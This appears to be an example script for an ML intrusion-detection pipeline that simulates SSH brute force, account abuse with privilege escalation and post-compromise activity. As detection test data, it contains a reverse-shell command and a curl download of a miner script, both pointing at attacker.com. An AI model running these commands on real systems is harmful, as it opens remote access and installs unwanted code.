"""
Example: Attack Scenario Simulation

Demonstrates the detection pipeline with realistic attack scenarios:
1. Brute force SSH attack
2. Valid account abuse with privesc
3. Post-compromise LOLBin execution
"""

import json
from datetime import datetime, timedelta
from devilnet.ingestion.log_parser import AuthEvent
from devilnet.ml.feature_extraction import FeatureExtractor
from devilnet.ml.pipeline import MLPipeline, IsolationForestModel
from devilnet.core.mitre_mapping import MitreATTACKMapping
from devilnet.reporting.reporter import IncidentReportGenerator
import numpy as np


def generate_baseline_events():
    """Generate normal authentication events for baseline training"""
    events = []
    
    # Normal user login pattern (2-4 logins per day, different IPs periodically)
    for day in range(10):
        for i in range(3):
            events.append(AuthEvent(
                timestamp=(datetime.now() - timedelta(days=10-day, hours=i*8)).isoformat(),
                host='webserver',
                source_ip=f"192.168.1.{100 + day}",
                source_port=22000 + i,
                username='alice',
                auth_method='publickey',
                event_type='login_success',
                service='sshd',
                message='Accepted publickey for alice from 192.168.1.100 port 22000',
                raw_line='...',
            ))
    
    # Normal sudo usage (2-3 times per day)
    for day in range(10):
        events.append(AuthEvent(
            timestamp=(datetime.now() - timedelta(days=10-day, hours=9)).isoformat(),
            host='webserver',
            source_ip=None,
            source_port=None,
            username='alice',
            auth_method='sudo',
            event_type='sudo_success',
            service='sudo',
            message='alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/systemctl restart nginx',
            raw_line='...',
        ))
    
    # Normal admin user
    for day in range(10):
        for i in range(2):
            events.append(AuthEvent(
                timestamp=(datetime.now() - timedelta(days=10-day, hours=i*12)).isoformat(),
                host='webserver',
                source_ip=f"10.0.0.{50 + day}",
                source_port=22000 + i,
                username='admin',
                auth_method='publickey',
                event_type='login_success',
                service='sshd',
                message='Accepted publickey for admin from 10.0.0.50 port 22000',
                raw_line='...',
            ))
    
    return events


def generate_brute_force_attack():
    """Generate simulated brute force SSH attack"""
    events = []
    attacker_ip = "203.0.113.99"
    
    # 50 rapid failed login attempts
    for i in range(50):
        events.append(AuthEvent(
            timestamp=(datetime.now() - timedelta(seconds=100-i*2)).isoformat(),
            host='webserver',
            source_ip=attacker_ip,
            source_port=50000 + i,
            username=['root', 'admin', 'test', 'guest', 'deploy'][i % 5],
            auth_method='password',
            event_type='login_failed',
            service='sshd',
            message=f'Failed password for user from {attacker_ip} port {50000+i}',
            raw_line='...',
        ))
    
    return events


def generate_valid_account_abuse():
    """Generate valid account abuse attack after compromise"""
    events = []
    
    # Successful login from NEW geographic location
    events.append(AuthEvent(
        timestamp=datetime.now().isoformat(),
        host='webserver',
        source_ip='198.51.100.45',  # Different from normal 192.168.1.x
        source_port=54321,
        username='alice',
        auth_method='password',  # Unusual - normally publickey
        event_type='login_success',
        service='sshd',
        message='Accepted password for alice from 198.51.100.45 port 54321',
        raw_line='...',
    ))
    
    # Immediately attempt privilege escalation
    events.append(AuthEvent(
        timestamp=(datetime.now() + timedelta(seconds=5)).isoformat(),
        host='webserver',
        source_ip=None,
        source_port=None,
        username='alice',
        auth_method='sudo',
        event_type='sudo_success',
        service='sudo',
        message='alice : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash',
        raw_line='...',
    ))
    
    return events


def generate_post_compromise_activity():
    """Generate post-compromise LOLBin execution"""
    events = []
    
    # First, successful login
    events.append(AuthEvent(
        timestamp=datetime.now().isoformat(),
        host='webserver',
        source_ip='198.51.100.46',
        source_port=54322,
        username='bob',
        auth_method='publickey',
        event_type='login_success',
        service='sshd',
        message='Accepted publickey for bob from 198.51.100.46',
        raw_line='...',
    ))
    
    # Suspicious shell activity
    events.append(AuthEvent(
        timestamp=(datetime.now() + timedelta(seconds=10)).isoformat(),
        host='webserver',
        source_ip=None,
        source_port=None,
        username='bob',
        auth_method='shell',
        event_type='shell_execution',
        service='sshd',
        message='Executed: /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        raw_line='...',
    ))
    
    # curl download (tool transfer)
    events.append(AuthEvent(
        timestamp=(datetime.now() + timedelta(seconds=15)).isoformat(),
        host='webserver',
        source_ip=None,
        source_port=None,
        username='bob',
        auth_method='exec',
        event_type='process_execution',
        service='auditd',
        message='Executed: /usr/bin/curl -o /tmp/miner.sh http://attacker.com/miner.sh',
        raw_line='...',
    ))
    
    return events


def demonstrate_detection():
    """Demonstrate the full detection pipeline"""
    print("\n" + "="*80)
    print("DEVILNET ML ANOMALY DETECTION DEMONSTRATION")
    print("="*80 + "\n")
    
    # Step 1: Generate baseline
    print("STEP 1: Generating baseline (normal) events...")
    baseline_events = generate_baseline_events()
    print(f"  - Generated {len(baseline_events)} baseline events")
    
    # Step 2: Train model
    print("\nSTEP 2: Training ML model on baseline...")
    feature_extractor = FeatureExtractor(window_minutes=5)
    baseline_vectors = []
    for event in baseline_events:
        vector = feature_extractor.extract_features(event)
        baseline_vectors.append(vector)
    
    ml_pipeline = MLPipeline()
    ml_pipeline.train_from_baseline(baseline_vectors)
    print(f"  - Model trained on {len(baseline_vectors)} feature vectors")
    
    # Step 3: Generate and detect attack scenarios
    print("\nSTEP 3: Simulating attack scenarios and detecting anomalies...\n")
    
    # Scenario 1: Brute Force
    print("-" * 80)
    print("SCENARIO 1: BRUTE FORCE SSH ATTACK")
    print("-" * 80)
    
    brute_force_events = generate_brute_force_attack()
    print(f"  Attack: {len(brute_force_events)} failed login attempts from 203.0.113.99")
    
    feature_extractor_attack = FeatureExtractor(window_minutes=5)
    # Include baseline for context
    for event in baseline_events[-10:]:
        feature_extractor_attack.extract_features(event)
    
    # Process attack events
    attack_vectors = []
    attack_metadata = []
    for event in brute_force_events[:10]:  # First 10 for demo
        vector = feature_extractor_attack.extract_features(event)
        attack_vectors.append(vector)
        attack_metadata.append({
            'event_id': vector.event_id,
            'timestamp': vector.timestamp,
            'source_ip': vector.source_ip,
            'username': vector.username,
            'event_type': vector.event_type,
        })
    
    anomaly_scores = ml_pipeline.infer(attack_vectors, attack_metadata)
    anomalies = [a for a in anomaly_scores if a.is_anomaly]
    
    print(f"  Detection: {len(anomalies)}/{len(attack_vectors)} detected as anomalies")
    
    if anomalies:
        anomaly = anomalies[0]
        print(f"  Risk Level: {anomaly.risk_level}")
        print(f"  Score: {anomaly.anomaly_score:.3f}")
        print(f"  Explanation: {anomaly.explanation}")
        
        # MITRE mapping
        mitre_techniques = MitreATTACKMapping.get_techniques_for_event(
            'login_failed',
            {
                'ip_failed_logins': attack_vectors[0].ip_failed_logins,
                'ip_unique_users_attempted': attack_vectors[0].ip_unique_users_attempted,
            }
        )
        print(f"  MITRE Techniques: {', '.join([t.technique_id for t in mitre_techniques])}")
    
    # Scenario 2: Valid Account Abuse + Privesc
    print("\n" + "-" * 80)
    print("SCENARIO 2: VALID ACCOUNT ABUSE + PRIVILEGE ESCALATION")
    print("-" * 80)
    
    valid_account_events = generate_valid_account_abuse()
    print(f"  Attack: Login from new IP + immediate sudo to root")
    
    feature_extractor_abuse = FeatureExtractor(window_minutes=5)
    for event in baseline_events[-10:]:
        feature_extractor_abuse.extract_features(event)
    
    abuse_vectors = []
    abuse_metadata = []
    for event in valid_account_events:
        vector = feature_extractor_abuse.extract_features(event)
        abuse_vectors.append(vector)
        abuse_metadata.append({
            'event_id': vector.event_id,
            'timestamp': vector.timestamp,
            'source_ip': vector.source_ip,
            'username': vector.username,
            'event_type': vector.event_type,
        })
    
    anomaly_scores = ml_pipeline.infer(abuse_vectors, abuse_metadata)
    anomalies = [a for a in anomaly_scores if a.is_anomaly]
    
    print(f"  Detection: {len(anomalies)}/{len(abuse_vectors)} detected as anomalies")
    
    if anomalies:
        anomaly = anomalies[0]
        print(f"  Risk Level: {anomaly.risk_level}")
        print(f"  Score: {anomaly.anomaly_score:.3f}")
        print(f"  Explanation: {anomaly.explanation}")
        print(f"  Features: {anomaly.contributing_features}")
    
    # Scenario 3: Post-Compromise Activity
    print("\n" + "-" * 80)
    print("SCENARIO 3: POST-COMPROMISE LOLBIN EXECUTION")
    print("-" * 80)
    
    post_compromise_events = generate_post_compromise_activity()
    print(f"  Attack: Reverse shell + tool download")
    
    feature_extractor_post = FeatureExtractor(window_minutes=5)
    for event in baseline_events[-10:]:
        feature_extractor_post.extract_features(event)
    
    post_vectors = []
    post_metadata = []
    for event in post_compromise_events:
        vector = feature_extractor_post.extract_features(event)
        post_vectors.append(vector)
        post_metadata.append({
            'event_id': vector.event_id,
            'timestamp': vector.timestamp,
            'source_ip': vector.source_ip,
            'username': vector.username,
            'event_type': vector.event_type,
        })
    
    anomaly_scores = ml_pipeline.infer(post_vectors, post_metadata)
    anomalies = [a for a in anomaly_scores if a.is_anomaly]
    
    print(f"  Detection: {len(anomalies)}/{len(post_vectors)} detected as anomalies")
    
    if anomalies:
        anomaly = anomalies[-1]  # Last anomaly (tool execution)
        print(f"  Risk Level: {anomaly.risk_level}")
        print(f"  Score: {anomaly.anomaly_score:.3f}")
        print(f"  Explanation: {anomaly.explanation}")
        print(f"  LOLBin Detected: {post_vectors[-1].session_lolbin_executed}")
    
    print("\n" + "="*80)
    print("DEMONSTRATION COMPLETE")
    print("="*80 + "\n")


def generate_example_report():
    """Generate example incident report"""
    print("\n" + "="*80)
    print("EXAMPLE INCIDENT REPORT")
    print("="*80 + "\n")
    
    report_generator = IncidentReportGenerator()
    
    # Create mock anomaly
    class MockAnomaly:
        anomaly_score = 0.85
        risk_level = "HIGH"
        confidence = 0.92
        explanation = "Detected brute force SSH attack: 42 failed login attempts from single IP with 8 different usernames in 90 seconds"
        contributing_features = {
            'ip_failed_logins': 0.95,
            'ip_unique_users_attempted': 0.88,
            'ip_failed_to_success_ratio': 0.87,
            'ip_avg_inter_attempt_seconds': 0.45,
        }
    
    # Create mock feature vector
    class MockVector:
        ip_failed_logins = 42
        ip_unique_users_attempted = 8
        ip_failed_to_success_ratio = 0.98
        user_new_ip_detected = False
        user_first_sudo_usage = False
        user_failed_sudo_attempts = 0
        session_login_to_privesc_seconds = 0
        session_lolbin_executed = False
    
    report = report_generator.generate_report(
        anomaly_score=MockAnomaly(),
        event_type='login_failed',
        source_ip='203.0.113.99',
        username=None,
        feature_vector=MockVector(),
    )
    
    # Print report
    print(report.to_human_readable())
    
    # Also show JSON
    print("\nJSON REPORT:")
    print(json.dumps(report.to_dict(), indent=2))


if __name__ == '__main__':
    demonstrate_detection()
    generate_example_report()
